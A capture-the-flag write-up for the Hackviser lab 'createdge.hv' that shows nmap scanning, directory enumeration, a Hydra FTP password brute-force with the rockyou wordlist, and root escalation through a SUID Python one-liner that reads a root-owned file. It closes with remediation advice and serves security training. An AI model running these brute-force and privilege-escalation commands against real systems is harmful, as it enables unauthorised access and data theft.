# Orbitronix Systems

**Author:** Neelesh Pandey  
**Platform:** Hackviser  
**Target:** `createdge.hv`  
**Category:** Enumeration / Privilege Escalation  
**Difficulty:** Medium  

---

## Objective

Enumerate the Create Edge server to extract confidential information about Orbitronix Systems' marketing campaign:

| # | Flag | Status |
|---|------|--------|
| 1 | Advertising budget | Captured |
| 2 | Target audience | Captured |
| 3 | Secret marketing tool | Captured |

---

## Methodology

```
Nmap scan → Directory enumeration → FTP brute-force → 
Web asset analysis → SUID exploitation → Root file access
```

---

## 1. Reconnaissance

### 1.1 Nmap Service Scan

```bash
nmap -sV createdge.hv
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

**Findings:**
- FTP (port 21) and HTTP (port 80) both open
- Target OS: Unix-like (Debian)
- Two potential attack surfaces identified

---

### 1.2 Directory Enumeration

HTTP directory scan against the web server:

```
/.htaccess     → 403 Forbidden
/.htpasswd     → 403 Forbidden
/assets        → 301 Redirect
/ftp           → 301 Redirect  ← interesting
/index.html    → 200 OK
/vendor        → 301 Redirect
```

**Findings:** `/ftp` and `/assets` directories accessible — worth investigating further.

---

## 2. FTP Enumeration

### 2.1 Credential Discovery via Brute Force

Brute-forced FTP credentials using Hydra with a common wordlist:

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://createdge.hv
```

**Valid credentials found:**

```
Username: ftpuser
Password: password
```

### 2.2 File Discovery via FTP

Logged in and listed available files:

```bash
ftp createdge.hv
# login with ftpuser:password
ls
```

**Files found:**

```
clients.csv
webshell.php
```

Extracted `clients.csv` — contained advertising budget data:

| Company Name | Advertising Budget ($) |
|---|---|
| Orbitronix Systems | 225,000 |

> **Flag 1 captured:** Advertising budget = **$225,000 USD**

**Note:** Target audience was not present in this file — further enumeration required.

---

## 3. Web Assets Enumeration

Inspected the `/assets/js` directory:

```
animation.js
imagesloaded.js
isotope.js
owl-carousel.js
tabs.js
templatemo-custom.js
```

Found an additional CSV at `/archive/detailed_client_info.csv` containing extended client data:

```
Orbitronix Systems, 225000, Brand Awareness, Yes, Young Adults, 12
```

> **Flag 2 captured:** Target audience = **Young Adults**

---

## 4. Privilege Escalation — SUID Binary Abuse

### 4.1 Meeting File Discovery

Found a restricted directory:

```
/archive/meetings/orbitronix_system-2023-11-20.txt
```

File permissions were restricted to `root` — direct read not possible as current user.

### 4.2 SUID Binary Enumeration

Searched for SUID binaries that could be abused for privilege escalation:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -E "python|bash|sh|perl"
```

**Results:**

```
/usr/bin/python3.9      ← exploitable
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
```

`/usr/bin/python3.9` had the SUID bit set — this allows executing code as root.

### 4.3 Exploiting SUID Python3

Used the SUID Python3 binary to escalate privileges and read the root-owned file:

```bash
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("cat /archive/meetings/orbitronix_system-2023-11-20.txt")'
```

**File revealed:** Secret marketing tool developed by Create Edge = **InsightNexus AI**

> **Flag 3 captured:** Secret marketing tool = **InsightNexus AI**

---

## 5. Flags Summary

| Flag | Value |
|------|-------|
| Orbitronix advertising budget | $225,000 USD |
| Target audience | Young Adults |
| Secret marketing tool | InsightNexus AI |

---

## 6. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Service and port scanning |
| `gobuster` | HTTP directory enumeration |
| `hydra` | FTP credential brute-force |
| `ftp` | File retrieval from FTP server |
| `find` | SUID binary enumeration |
| `python3` | Privilege escalation via SUID abuse |

---

## 7. Key Takeaways

- **Weak FTP credentials** (`password` as a password) are a critical misconfiguration — always test default and common credentials during assessments
- **SUID binaries** on non-standard executables like Python are a serious privilege escalation risk; `python3` should never have the SUID bit set in production
- **Sensitive data in web-accessible directories** (`/ftp`, `/archive`) should be protected behind authentication, not just file permissions
- A complete CTF methodology flows naturally: port scan → directory enum → credential attack → file analysis → privilege escalation

---

## 8. Remediation Recommendations

| Finding | Risk | Fix |
|---------|------|-----|
| Weak FTP password | High | Enforce strong password policy; disable anonymous FTP |
| SUID on Python3 | Critical | Remove SUID bit: `chmod u-s /usr/bin/python3.9` |
| Sensitive files in web root | High | Move outside web root or require authentication |
| FTP service exposed | Medium | Replace FTP with SFTP; restrict by IP |

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
